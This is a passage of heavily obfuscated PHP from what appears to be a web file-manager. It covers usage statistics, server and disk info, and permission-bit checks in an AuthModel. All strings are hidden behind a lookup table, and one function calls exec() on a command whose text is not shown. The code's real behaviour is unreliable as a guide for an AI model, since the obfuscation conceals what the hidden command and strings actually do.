$”…ªª = Model($³ÈµŞ™Ô[845])->where($Íö²Š¾)->sum($³ÈµŞ™Ô[76]); $Íö²Š¾[$³ÈµŞ™Ô[449]] = 2; $“¶œÒÖÇ = Model($³ÈµŞ™Ô[845])->where($Íö²Š¾)->sum($³ÈµŞ™Ô[76]); $›òî¹ç = array($³ÈµŞ™Ô[224] => $ØªÃáõ×, $³ÈµŞ™Ô[783] => (int) $ÜËÕª‹é, $³ÈµŞ™Ô[1785] => (int) $•‘«½»Ä, $³ÈµŞ™Ô[1786] => (int) $”…ªª, $³ÈµŞ™Ô[1787] => (int) $“¶œÒÖÇ); return $this->insert($›òî¹ç); } public function trend($ëÄ‚œñ‰, $’¡óÍ¨À) { $±·ø¿ÕÀ =& $_SERVER[¡“ËÌ§œ]; if (!$this->init($ëÄ‚œñ‰)) { return !1; } $ğª²ì”Ë = $this->trendList($ëÄ‚œñ‰); if ($ğª²ì”Ë && $’¡óÍ¨À != $±·ø¿ÕÀ[1634]) { $¤©„ˆâ = $ğª²ì”Ë[0][$±·ø¿ÕÀ[224]]; $şÑåß† = $this->validDate($’¡óÍ¨À, $¤©„ˆâ); $½î´˜”… = array(); $…Ú‘ñ¢Ö = array_to_keyvalue($ğª²ì”Ë, $±·ø¿ÕÀ[224]); foreach ($şÑåß† as $ÎĞËéÜÎ) { if (isset($…Ú‘ñ¢Ö[$ÎĞËéÜÎ])) { $ø®¤ÙŞÄ = $…Ú‘ñ¢Ö[$ÎĞËéÜÎ]; } else { $ø®¤ÙŞÄ = end($ğª²ì”Ë); $ø®¤ÙŞÄ[$±·ø¿ÕÀ[224]] = $ÎĞËéÜÎ; if ($ëÄ‚œñ‰ == $±·ø¿ÕÀ[628]) { $ø®¤ÙŞÄ[$±·ø¿ÕÀ[1781]] = $ø®¤ÙŞÄ[$±·ø¿ÕÀ[1782]] = 0; } } $½î´˜”…[] = $ø®¤ÙŞÄ; } $ğª²ì”Ë = $½î´˜”…; } $Æğšä¹¹ = array($±·ø¿ÕÀ[628] => array($±·ø¿ÕÀ[785] => LNG($±·ø¿ÕÀ[1797]), $±·ø¿ÕÀ[1781] => LNG($±·ø¿ÕÀ[1798]), $±·ø¿ÕÀ[1782] => LNG($±·ø¿ÕÀ[1799])), $±·ø¿ÕÀ[1783] => array($±·ø¿ÕÀ[783] => LNG($±·ø¿ÕÀ[1800]), $±·ø¿ÕÀ[1785] => LNG($±·ø¿ÕÀ[1801]), $±·ø¿ÕÀ[1786] => LNG($±·ø¿ÕÀ[1802]), $±·ø¿ÕÀ[1787] => LNG($±·ø¿ÕÀ[1803]))); $…¢Òáêî = array($±·ø¿ÕÀ[628] => $±·ø¿ÕÀ[1804], $±·ø¿ÕÀ[1783] => $±·ø¿ÕÀ[76]); if (empty($ğª²ì”Ë)) { $ÎĞËéÜÎ = date($±·ø¿ÕÀ[1788], strtotime($±·ø¿ÕÀ[1789])); $‰ƒ˜Œ»å = array($±·ø¿ÕÀ[224] => $ÎĞËéÜÎ); foreach ($Æğšä¹¹[$ëÄ‚œñ‰] as $±Ãë‰Î« => $üŞ¢¡´Á) { $‰ƒ˜Œ»å[$±Ãë‰Î«] = 0; } $ğª²ì”Ë[] = $‰ƒ˜Œ»å; } $²ÅÜ‘¡Ñ = array(); foreach ($ğª²ì”Ë as $üŞ¢¡´Á) { if ($ëÄ‚œñ‰ == $±·ø¿ÕÀ[1783] && $üŞ¢¡´Á[$±·ø¿ÕÀ[1785]] > $üŞ¢¡´Á[$±·ø¿ÕÀ[783]]) { $üŞ¢¡´Á[$±·ø¿ÕÀ[1785]] = $üŞ¢¡´Á[$±·ø¿ÕÀ[783]]; } foreach ($Æğšä¹¹[$ëÄ‚œñ‰] as $±Ãë‰Î« => $»ü§ã¯×) { $ø®¤ÙŞÄ = array($±·ø¿ÕÀ[224] => $üŞ¢¡´Á[$±·ø¿ÕÀ[224]], $±·ø¿ÕÀ[1559] => $»ü§ã¯×); $ø®¤ÙŞÄ[$…¢Òáêî[$ëÄ‚œñ‰]] = isset($üŞ¢¡´Á[$±Ãë‰Î«]) ? $üŞ¢¡´Á[$±Ãë‰Î«] : 0; $²ÅÜ‘¡Ñ[] = $ø®¤ÙŞÄ; } } return $²ÅÜ‘¡Ñ; } public function validDate($Öé†æë, $¬ü¾…Ë—) { $™ÕÂÕ¾ä =& $_SERVER[¡“ËÌ§œ]; $¤¹Æ•´Ÿ = date($™ÕÂÕ¾ä[1788], strtotime($™ÕÂÕ¾ä[1789])); $³ò©÷¦ = array($¤¹Æ•´Ÿ); switch ($Öé†æë) { case $™ÕÂÕ¾ä[1641]: $´¥¢ç·– = mktime(0, 0, 0, date($™ÕÂÕ¾ä[1805]), date($™ÕÂÕ¾ä[1381]) - date($™ÕÂÕ¾ä[1444]) + 7 - 7, date($™ÕÂÕ¾ä[1806])); $¨°ãµˆ° = 0; do { $ éĞñÆª = date($™ÕÂÕ¾ä[1788], $´¥¢ç·– - 3600 * 24 * 7 * $¨°ãµˆ°); $³ò©÷¦[] = $ éĞñÆª; $¨°ãµˆ°++; } while ($¬ü¾…Ë— < $ éĞñÆª); break; case $™ÕÂÕ¾ä[1639]: $¨°ãµˆ° = 1; do { $ª‘Û¨è = date($™ÕÂÕ¾ä[1807], strtotime("\55\x20{$¨°ãµˆ°}\x20\x6d\x6f\156\x74\x68\163")); $³ò©÷¦[] = $ª‘Û¨è; $¨°ãµˆ°++; } while ($¬ü¾…Ë— < $ª‘Û¨è); break; case $™ÕÂÕ¾ä[1808]: $ğ”¬¿ø = (int) date($™ÕÂÕ¾ä[1806], strtotime($¬ü¾…Ë—)); $§–ÏæŸî = (int) date($™ÕÂÕ¾ä[1806]); if ($ğ”¬¿ø >= $§–ÏæŸî) { break; } for ($ğ”¬¿ø; $ğ”¬¿ø < $§–ÏæŸî; $ğ”¬¿ø++) { $³ò©÷¦[] = $ğ”¬¿ø . $™ÕÂÕ¾ä[1809]; } break; default: break; } if ($¬ü¾…Ë— > end($³ò©÷¦)) { array_pop($³ò©÷¦); } sort($³ò©÷¦); return $³ò©÷¦; } public function listTable($ÔŠì“Ùõ) { $ñ¤ˆè°Æ = ucfirst($ÔŠì“Ùõ); return Model($ñ¤ˆè°Æ)->listData(); } public function option($×ì€è”¸) { $ªê¬Ş’Ñ = $_SERVER[¡“ËÌ§œ][1810] . ucfirst($×ì€è”¸); return $this->{$ªê¬Ş’Ñ}(); } private function optionUser() { $Ñü’Ó² =& $_SERVER[¡“ËÌ§œ]; $§î‹Ÿß½ = Model($Ñü’Ó²[563])->count($Ñü’Ó²[1661]); $ê»ú’Ï¾ = Model($Ñü’Ó²[563])->where($Ñü’Ó²[1811])->count($Ñü’Ó²[1661]); $ùáš´ù™ = intval($GLOBALS[$Ñü’Ó²[6]][$Ñü’Ó²[378]][$Ñü’Ó²[1614]]) / 3600; $ò³¸—÷ = strtotime("\x2d{$ùáš´ù™}\40\x68\157\165\x72\163"); $Â¾™ÉÉÊ = strtotime(date($Ñü’Ó²[1792])); if ($ò³¸—÷ < $Â¾™ÉÉÊ) { $ò³¸—÷ = $Â¾™ÉÉÊ; } $³ğëî×‰ = array($Ñü’Ó²[1812] => array($Ñü’Ó²[1034], $ò³¸—÷)); $ÛËœì™¾ = (int) Model($Ñü’Ó²[563])->where($³ğëî×‰)->count($Ñü’Ó²[1661]); if (!$ÛËœì™¾) { $ÛËœì™¾ = 1; } $³ğëî×‰ = array($Ñü’Ó²[1812] => array($Ñü’Ó²[1034], $Â¾™ÉÉÊ)); $“˜¸¦š  = Model($Ñü’Ó²[563])->where($³ğëî×‰)->count($Ñü’Ó²[1661]); return array($Ñü’Ó²[778] => (int) $§î‹Ÿß½, $Ñü’Ó²[1813] => (int) ($§î‹Ÿß½ - $ê»ú’Ï¾), $Ñü’Ó²[1814] => (int) $ê»ú’Ï¾, $Ñü’Ó²[1815] => (int) $“˜¸¦š , $Ñü’Ó²[1816] => $ÛËœì™¾); } private function optionFile() { $³ÒĞ¬èÇ =& $_SERVER[¡“ËÌ§œ]; $Æ¤´¶ª = $this->sourceSize(); $ˆË×„Ââ = $Æ¤´¶ª[$³ÒĞ¬èÇ[76]]; $ÑÊş¥§é = $Æ¤´¶ª[$³ÒĞ¬èÇ[1785]]; $ß‘‡Ù× = Model($³ÒĞ¬èÇ[845])->where(array($³ÒĞ¬èÇ[448] => 0))->count($³ÒĞ¬èÇ[440]); $²’ŸÚÖÑ = array($³ÒĞ¬èÇ[448] => 0, $³ÒĞ¬èÇ[201] => array($³ÒĞ¬èÇ[1034], strtotime(date($³ÒĞ¬èÇ[1792])))); $ØÓ¤‘¨ = Model($³ÒĞ¬èÇ[845])->where($²’ŸÚÖÑ)->sum($³ÒĞ¬èÇ[76]); $÷¨“¡—º = Model($³ÒĞ¬èÇ[845])->where($²’ŸÚÖÑ)->count($³ÒĞ¬èÇ[440]); return array($³ÒĞ¬èÇ[783] => $ˆË×„Ââ, $³ÒĞ¬èÇ[1785] => $ÑÊş¥§é, $³ÒĞ¬èÇ[1817] => $ˆË×„Ââ - $ÑÊş¥§é, $³ÒĞ¬èÇ[1818] => (int) $ØÓ¤‘¨, $³ÒĞ¬èÇ[785] => (int) $ß‘‡Ù×, $³ÒĞ¬èÇ[1819] => (int) $÷¨“¡—º); } private function optionAccess() { $¥˜‹¢Êº =& $_SERVER[¡“ËÌ§œ]; return array($¥˜‹¢Êº[778] => $this->typeLogCnt(), $¥˜‹¢Êº[107] => $this->typeLogCnt($¥˜‹¢Êº[107]), $¥˜‹¢Êº[490] => $this->typeLogCnt($¥˜‹¢Êº[490]), $¥˜‹¢Êº[1820] => $this->typeLogCnt($¥˜‹¢Êº[1820]), $¥˜‹¢Êº[1821] => $this->typeLogCnt($¥˜‹¢Êº[1821]), $¥˜‹¢Êº[628] => $this->typeLogCnt($¥˜‹¢Êº[12], $¥˜‹¢Êº[1796])); } private function typeLogCnt($±ßı®± = '', $©ù–à’Ø = "\x69\144") { $Üìµæ÷ =& $_SERVER[¡“ËÌ§œ]; $•¾æıÃğ = array($Üìµæ÷[107] => array($Üìµæ÷[1822], $Üìµæ÷[1823]), $Üìµæ÷[490] => array($Üìµæ÷[1824], $Üìµæ÷[1825]), $Üìµæ÷[1820] => array($Üìµæ÷[1826], $Üìµæ÷[1827], $Üìµæ÷[1828]), $Üìµæ÷[1821] => array($Üìµæ÷[1829], $Üìµæ÷[1830]), $Üìµæ÷[1831] => array($Üìµæ÷[1832], $Üìµæ÷[1833], $Üìµæ÷[1834])); $ù›ëı‘Â = strtotime(date($Üìµæ÷[1792])); $ƒŞ¤³ä = array($Üìµæ÷[201] => array($Üìµæ÷[1034], $ù›ëı‘Â)); if ($±ßı®±) { $ƒŞ¤³ä[$Üìµæ÷[33]] = array($Üìµæ÷[7], $•¾æıÃğ[$±ßı®±]); } $ÅÆı¹³” = Model($Üìµæ÷[1795])->where($ƒŞ¤³ä)->count($©ù–à’Ø); return (int) $ÅÆı¹³”; } private function optionServer() { $ûëñâŸÊ =& $_SERVER[¡“ËÌ§œ]; $‹ÂœÊ² = $this->diskDriver(); $×‹ÓÒ¨ = KodIO::defaultDriver(); $œÁÛ®¯ˆ = array($ûëñâŸÊ[837] => $×‹ÓÒ¨[$ûëñâŸÊ[437]]); $¿Şâ’û™ = Model($ûëñâŸÊ[509])->where($œÁÛ®¯ˆ)->sum($ûëñâŸÊ[76]); $·´¨ŒñŸ = explode($ûëñâŸÊ[53], $_SERVER[$ûëñâŸÊ[143]]); $“’³ú² = $·´¨ŒñŸ[0]; $Æ›ô·ûÍ = $GLOBALS[$ûëñâŸÊ[6]][$ûëñâŸÊ[21]]; $©›ÃÁÃ = $Æ›ô·ûÍ[$ûëñâŸÊ[996]]; if ($©›ÃÁÃ == $ûëñâŸÊ[984]) { $°ŠÁò÷Ò = explode($ûëñâŸÊ[1302], $Æ›ô·ûÍ[$ûëñâŸÊ[995]]); $©›ÃÁÃ = $°ŠÁò÷Ò[0]; } if ($©›ÃÁÃ == $ûëñâŸÊ[932] || $©›ÃÁÃ == $ûëñâŸÊ[824]) { $¡á®ãÉ˜ = Model()->db()->query($ûëñâŸÊ[1835]); $Ç‰ŞÔ‰¯ = $¡á®ãÉ˜[0] && isset($¡á®ãÉ˜[0][$ûëñâŸÊ[1558]]) ? $¡á®ãÉ˜[0][$ûëñâŸÊ[1558]] : 0; $©›ÃÁÃ = $ûëñâŸÊ[1836] . ($Ç‰ŞÔ‰¯ ? $ûëñâŸÊ[8] . $Ç‰ŞÔ‰¯ : $ûëñâŸÊ[12]); } $Ùî¿ˆ—… = $GLOBALS[$ûëñâŸÊ[6]][$ûëñâŸÊ[378]][$ûëñâŸÊ[847]]; return array($ûëñâŸÊ[1837] => $‹ÂœÊ² ? $‹ÂœÊ²[$ûëñâŸÊ[1838]] : 0, $ûëñâŸÊ[1839] => $‹ÂœÊ² ? $‹ÂœÊ²[$ûëñâŸÊ[1840]] : 0, $ûëñâŸÊ[1841] => (int) $×‹ÓÒ¨[$ûëñâŸÊ[1838]] * 1024 * 1024 * 1024, $ûëñâŸÊ[1842] => (int) $¿Şâ’û™, $ûëñâŸÊ[1843] => ucfirst($“’³ú²), $ûëñâŸÊ[1844] => $ûëñâŸÊ[1845] . PHP_VERSION, $ûëñâŸÊ[1846] => phpBuild64() ? 64 : 32, $ûëñâŸÊ[777] => str_replace($ûëñâŸÊ[1150], $ûëñâŸÊ[1012], $©›ÃÁÃ), $ûëñâŸÊ[378] => ucfirst($Ùî¿ˆ—…), $ûëñâŸÊ[32] => $_SERVER[$ûëñâŸÊ[1847]]); } private function diskDriver() { $Ì¦½ğ™â =& $_SERVER[¡“ËÌ§œ]; $ªŠ€¬ğš = $Ì¦½ğ™â[8]; $¯ª‡æŞ› = $GLOBALS[$Ì¦½ğ™â[6]][$Ì¦½ğ™â[1319]] == $Ì¦½ğ™â[1320]; if ($¯ª‡æŞ›) { $ªŠ€¬ğš = $Ì¦½ğ™â[1848]; if (function_exists($Ì¦½ğ™â[1849])) { exec($Ì¦½ğ™â[1850], $Äç…ó¹); $ªŠ€¬ğš = $Äç…ó¹[1] . $Ì¦½ğ™â[8]; } } if (!file_exists($ªŠ€¬ğš)) { return; } $«ÅŞî™ñ = @disk_total_space($ªŠ€¬ğš); $şá¿Îïö = $«ÅŞî™ñ - @disk_free_space($ªŠ€¬ğš); return array($Ì¦½ğ™â[1838] => $«ÅŞî™ñ, $Ì¦½ğ™â[1840] => $şá¿Îïö); } public function fileChart($ŠŞ¯¿øô) { $õº×å‚“ =& $_SERVER[¡“ËÌ§œ]; if (isset($ŠŞ¯¿øô[$õº×å‚“[1661]])) { return Model($õº×å‚“[845])->userFileTypeProfile($ŠŞ¯¿øô[$õº×å‚“[1661]]); } if (isset($ŠŞ¯¿øô[$õº×å‚“[1851]])) { return Model($õº×å‚“[845])->groupFileTypeProfile($ŠŞ¯¿øô[$õº×å‚“[1851]]); } $â¿¥¦ı¬ = $this->sourceSize(); $É£èÎ—À = array($õº×å‚“[470] => 0, $õº×å‚“[449] => 1); $ÒÎø©àÈ = Model($õº×å‚“[845])->where($É£èÎ—À)->sum($õº×å‚“[76]); $É£èÎ—À[$õº×å‚“[449]] = 2; $‰•Š›Ç = Model($õº×å‚“[845])->where($É£èÎ—À)->sum($õº×å‚“[76]); return array($õº×å‚“[783] => $â¿¥¦ı¬[$õº×å‚“[76]], $õº×å‚“[1785] => $â¿¥¦ı¬[$õº×å‚“[1785]], $õº×å‚“[1786] => (int) $ÒÎø©àÈ, $õº×å‚“[1787] => (int) $‰•Š›Ç); } private function sourceSize() { $ßÒˆÃİÈ =& $_SERVER[¡“ËÌ§œ]; $ş¡æµè = Model($ßÒˆÃİÈ[845])->where(array($ßÒˆÃİÈ[448] => 0))->sum($ßÒˆÃİÈ[76]); $¸ªöÚÈĞ = Model($ßÒˆÃİÈ[509])->sum($ßÒˆÃİÈ[76]); if ($¸ªöÚÈĞ > $ş¡æµè) { $¸ªöÚÈĞ = $ş¡æµè; } return array($ßÒˆÃİÈ[76] => (int) $ş¡æµè, $ßÒˆÃİÈ[1785] => (int) $¸ªöÚÈĞ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¢›½ïç° =& $_SERVER[¡“ËÌ§œ]; $šæ½Ó¨ = array(array($¢›½ïç°[458] => LNG($¢›½ïç°[1852]), $¢›½ïç°[1853] => $¢›½ïç°[1854], $¢›½ïç°[1855] => 1, $¢›½ïç°[1856] => 1, $¢›½ïç°[1857] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢›½ïç°[458] => LNG($¢›½ïç°[1858]), $¢›½ïç°[1853] => $¢›½ïç°[1859], $¢›½ïç°[1855] => 2, $¢›½ïç°[1856] => 1, $¢›½ïç°[1857] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢›½ïç°[458] => LNG($¢›½ïç°[1860]), $¢›½ïç°[1853] => $¢›½ïç°[1861], $¢›½ïç°[1855] => 3, $¢›½ïç°[1856] => 1, $¢›½ïç°[1857] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢›½ïç°[458] => LNG($¢›½ïç°[1862]), $¢›½ïç°[1853] => $¢›½ïç°[1863], $¢›½ïç°[1855] => 4, $¢›½ïç°[1856] => 1, $¢›½ïç°[1857] => self::AUTH_SHOW | self::AUTH_VIEW), array($¢›½ïç°[458] => LNG($¢›½ïç°[1864]), $¢›½ïç°[1853] => $¢›½ïç°[1865], $¢›½ïç°[1855] => 5, $¢›½ïç°[1856] => 1, $¢›½ïç°[1857] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¢›½ïç°[458] => LNG($¢›½ïç°[1866]), $¢›½ïç°[1853] => $¢›½ïç°[1867], $¢›½ïç°[1855] => 6, $¢›½ïç°[1856] => 1, $¢›½ïç°[1857] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¢›½ïç°[458] => LNG($¢›½ïç°[1868]), $¢›½ïç°[1853] => $¢›½ïç°[1869], $¢›½ïç°[1855] => 7, $¢›½ïç°[1856] => 1, $¢›½ïç°[1857] => 0)); return $šæ½Ó¨; } public static function authCheck($ˆ€óêï·, $Ú™ã¹å) { $Ûô´‰úÈ =& $_SERVER[¡“ËÌ§œ]; $ˆ€óêï· = intval($ˆ€óêï·); if ($GLOBALS[$Ûô´‰úÈ[532]] && $GLOBALS[$Ûô´‰úÈ[6]][$Ûô´‰úÈ[1870]]) { return !0; } if ($ˆ€óêï· <= 0) { return !1; } if (($ˆ€óêï· & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ˆ€óêï· & $Ú™ã¹å); } public static function authCheckShow($¡ é²¦) { return self::authCheck($¡ é²¦, self::AUTH_SHOW); } public static function authCheckView($¸¢…†Ÿº) { return self::authCheck($¸¢…†Ÿº, self::AUTH_VIEW); } public static function authCheckDownload($íêÚì•) { return self::authCheck($íêÚì•, self::AUTH_DOWNLOAD); } public static function authCheckUpload($«îÍ·½) { return self::authCheck($«îÍ·½, self::AUTH_UPLOAD); } public static function authCheckEdit($ÀÛ“Œ¼×) { return self::authCheck($ÀÛ“Œ¼×, self::AUTH_EDIT); } public static function authCheckRemove($ˆÃ‚éÖ”) { return self::authCheck($ˆÃ‚éÖ”, self::AUTH_REMOVE); } public static function authCheckShare($æ‹©ªø) { return self::authCheck($æ‹©ªø, self::AUTH_SHARE); } public static function authCheckComment($¶èÌÇÉ) { return self::authCheck($¶èÌÇÉ, self::AUTH_COMMENT); } public static function authCheckEvent($Ì‡Ø¯Ş”) { return self::authCheck($Ì‡Ø¯Ş”, self::AUTH_EVENT); } public static function authCheckRoot($„æÜù«Ï) { return self::authCheck($„æÜù«Ï, self::AUTH_ROOT); } public static function authCheckAction($é‚ªŞÕ°, $Ç¿‰ÑÒ±) { $óêãœØ§ =& $_SERVER[¡“ËÌ§œ]; $Ö§Ë²¾È = array($óêãœØ§[1871] => self::AUTH_VIEW, $óêãœØ§[1214] => self::AUTH_DOWNLOAD, $óêãœØ§[107] => self::AUTH_UPLOAD, $óêãœØ§[1821] => self::AUTH_EDIT, $óêãœØ§[1820] => self::AUTH_REMOVE, $óêãœØ§[1831] => self::AUTH_SHARE, $óêãœØ§[383] => self::AUTH_COMMENT, $óêãœØ§[1649] => self::AUTH_EVENT, $óêãœØ§[1872] => self::AUTH_ROOT); if (!isset($Ö§Ë²¾È[$Ç¿‰ÑÒ±])) { return; } $üõ»˜° = $Ö§Ë²¾È[$Ç¿‰ÑÒ±]; $é‚ªŞÕ° = intval($é‚ªŞÕ°); if ($é‚ªŞÕ° <= 0) { return !1; } if (($é‚ªŞÕ° & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($é‚ªŞÕ° & $üõ»˜°); } public static function authDisable($×İĞ³Üû, $¤Ò©é…º) { if (intval($×İĞ³Üû) <= 0) { return 0; } return intval($×İĞ³Üû) & ~$¤Ò©é…º; } public $optionType = "\123\x79\x73\164\145\x6d\56\163\157\x75\x72\143\x65\101\165\x74\x68\114\151\x73\164"; public $field = array("\x6e\141\155\x65", "\x61\165\164\150", "\154\x61\142\145\x6c", "\x64\151\163\160\x6c\x61\171", "\163\x79\x73\x74\x65\155", "\163\x6f\x72\164"); public function initData() { $ô‘ıó•Ê = $this->authDefault(); foreach ($ô‘ıó•Ê as $šÊ™…Ôˆ) { $this->add($šÊ™…Ôˆ); } } public function findAuth($…É…ŸÓ™, $Ö¸Ãäû¬) { $ÇÔª˜°˜ =& $_SERVER[¡“ËÌ§œ]; $ª–©§¾ = parent::listData(); foreach ($ª–©§¾ as $êŸŒ–Æ) { $¸“¦ Õ = intval($êŸŒ–Æ[$ÇÔª˜°˜[451]]); if ($¸“¦ Õ <= 0 || $êŸŒ–Æ[$ÇÔª˜°˜[1873]] == 0) { continue; } if (($¸“¦ Õ & $…É…ŸÓ™) != $…É…ŸÓ™) { continue; } if (($¸“¦ Õ & $Ö¸Ãäû¬) != 0) { continue; } return $êŸŒ–Æ[$ÇÔª˜°˜[437]]; } return !1; } public function findAuthReadOnly() { $®„æ„«‰ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $î”Õƒƒà = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($®„æ„«‰, $î”Õƒƒà); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ ¤™áòì =& $_SERVER[¡“ËÌ§œ]; $±İÙ‘¯‹ = parent::listData(); $Ú­™òÛÀ = !1; foreach ($±İÙ‘¯‹ as $×ûó‡…à) { if ($×ûó‡…à[$ ¤™áòì[451]] <= 0 || $×ûó‡…à[$ ¤™áòì[1873]] == $ ¤™áòì[198]) { continue; } if (!$Ú­™òÛÀ) { $Ú­™òÛÀ = $×ûó‡…à; continue; } if ($Ú­™òÛÀ[$ ¤™áòì[451]] > $×ûó‡…à[$ ¤™áòì[451]]) { $Ú­™òÛÀ = $×ûó‡…à; } } return $Ú­™òÛÀ ? $Ú­™òÛÀ[$ ¤™áòì[437]] : $ ¤™áòì[12]; } public function listData($ø»•¬¿Á = false, $ó‡Êİ½• = "\163\x6f\x72\164", $ğÇá«ß´ = false) { return parent::listData($ø»•¬¿Á, $ó‡Êİ½•, $ğÇá«ß´); } public function update($ŠÇµô­, $³µñ¡À) { $ÓÄ†ì„¥ =& $_SERVER[¡“ËÌ§œ]; $¢×ÍçÈÂ = parent::listData($ŠÇµô­); $é¿»ïÙ© = $this->findByName($³µñ¡À[$ÓÄ†ì„¥[32]]); if (!$¢×ÍçÈÂ || $é¿»ïÙ© && $é¿»ïÙ©[$ÓÄ†ì„¥[437]] != $¢×ÍçÈÂ[$ÓÄ†ì„¥[437]]) { return !1; } $this->filterAuth($³µñ¡À[$ÓÄ†ì„¥[451]]); return parent::update($ŠÇµô­, $³µñ¡À); } public function remove($ÆÎÜá’İ) { $°ÎáÛ†ô = parent::listData($ÆÎÜá’İ); if (!$°ÎáÛ†ô || $°ÎáÛ†ô[$_SERVER[¡“ËÌ§œ][1307]]) { return !1; } return parent::remove($ÆÎÜá’İ); } public function add($í·ƒ„®· = array()) { $œ…³„Œ =& $_SERVER[¡“ËÌ§œ]; if ($this->findByName($í·ƒ„®·[$œ…³„Œ[32]])) { return !1; } $ªÎ‡‚Ñµ = array($œ…³„Œ[32] => $œ…³„Œ[12], $œ…³„Œ[451] => 1, $œ…³„Œ[1874] => $œ…³„Œ[1861], $œ…³„Œ[1873] => 1, $œ…³„Œ[1307] => 0, $œ…³„Œ[1875] => 0); $í·ƒ„®· = array_merge($ªÎ‡‚Ñµ, $í·ƒ„®·); $í·ƒ„®·[$œ…³„Œ[1875]] = $this->getSort(); $this->filterAuth($í·ƒ„®·[$œ…³„Œ[451]]); return parent::insert($í·ƒ„®·); } private function getSort() { $ˆÚéÂ‡È =& $_SERVER[¡“ËÌ§œ]; $©Á¿ù±Ğ = parent::listData(); $½’ù Ş¾ = array_to_keyvalue($©Á¿ù±Ğ, $ˆÚéÂ‡È[12], $ˆÚéÂ‡È[1875]); return empty($½’ù Ş¾) ? 0 : max($½’ù Ş¾) + 1; } private function filterAuth(&$ëûåëú) { if (!$ëûåëú) { return; } $²™œ‹’× = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $­¼’×ûÜ = array(); foreach ($²™œ‹’× as $¡Ãç™œ“) { if ($ëûåëú & $¡Ãç™œ“) { $­¼’×ûÜ[] = $¡Ãç™œ“; } } if (in_array(self::AUTH_ROOT, $­¼’×ûÜ)) { $ëûåëú = array_sum($²™œ‹’×); return; } $½™ÄíÀ” = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($­¼’×ûÜ as $¡Ãç™œ“) { if (isset($½™ÄíÀ”[$¡Ãç™œ“])) { $­¼’×ûÜ = array_merge($­¼’×ûÜ, $½™ÄíÀ”[$¡Ãç™œ“]); } } $­¼’×ûÜ[] = self::AUTH_SHOW; $ëûåëú = array_sum(array_unique($­¼’×ûÜ)); } public function sort($¯ë—õ–Å, $ØÔúì¯Â) { return parent::update($¯ë—õ–Å, $ØÔúì¯Â); } } goto a¤­¬­æâ; DÇ†–‘äê–: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\145"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\141\x6d\145" => "\x69\157\x5f\146\x69\154\x65\137\155\145\164\141", "\155\x65\164\x61\x46\x69\145\154\144" => "\x66\x69\x6c\x65\111\x44"); public function fileInfo($© êæ½) { $é¾»ñáó =& $_SERVER[¡“ËÌ§œ]; static $çÂ–ÕÓ— = array(); if (!isset($çÂ–ÕÓ—[$© êæ½])) { $—¥¡Ç¨ğ = $é¾»ñáó[1900]; $‚ß¯¹¸ = Model($é¾»ñáó[509])->field($—¥¡Ç¨ğ)->where(array($é¾»ñáó[507] => $© êæ½))->find(); $çÂ–ÕÓ—[$© êæ½] = $‚ß¯¹¸; } return $çÂ–ÕÓ—[$© êæ½]; } public function addFileByContent($¢…ôââÏ = '', $Ÿ·¥ÁÇ£ = '') { $ƒßúò° =& $_SERVER[¡“ËÌ§œ]; $áæÁ¡…× = TEMP_PATH . $ƒßúò°[1901]; if (!is_dir($áæÁ¡…×)) { mk_dir($áæÁ¡…×); } $ªß»ƒæ± = $áæÁ¡…× . $ƒßúò°[1902] . rand_string(16); file_put_contents($ªß»ƒæ±, $¢…ôââÏ); $æ¶¿¯ß = $this->addFile($ªß»ƒæ±, $Ÿ·¥ÁÇ£, !0); if (file_exists($ªß»ƒæ±)) { @unlink($ªß»ƒæ±); } return $æ¶¿¯ß; } public function createFileName($¤á•¥ñë, $…ş‰ìŞÅ = false, $Áåüï‘ = false) { $ß­˜åíÚ =& $_SERVER[¡“ËÌ§œ]; $¥ƒ•ØÜÜ = IO::init($ß­˜åíÚ[8]); $Šİ¯‹çñ = $this->makeFilePath($¤á•¥ñë, $¥ƒ•ØÜÜ, $…ş‰ìŞÅ, $Áåüï‘); $õ¤ˆ²Ñ = $¥ƒ•ØÜÜ->pathFather($Šİ¯‹çñ); static $ÜôÏËü = false; $ÑµíÏÅ = 